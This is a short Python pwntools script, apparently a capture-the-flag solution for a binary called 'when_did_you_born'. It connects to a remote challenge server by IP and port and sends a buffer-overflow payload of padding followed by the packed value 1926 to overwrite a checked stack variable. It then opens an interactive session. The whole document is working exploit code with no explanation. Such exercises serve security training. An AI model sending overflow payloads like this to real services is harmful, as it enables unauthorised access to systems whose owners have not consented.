from pwn import *
#sh = process('./when_did_you_born')
sh = remote('111.198.29.45',52538)
sh.recv()
sh.sendline('1925')
payload = 'AAaaaaaa'+p32(1926)
sh.recv()
sh.sendline(payload)
a=sh.recv()
print a
sh.interactive()

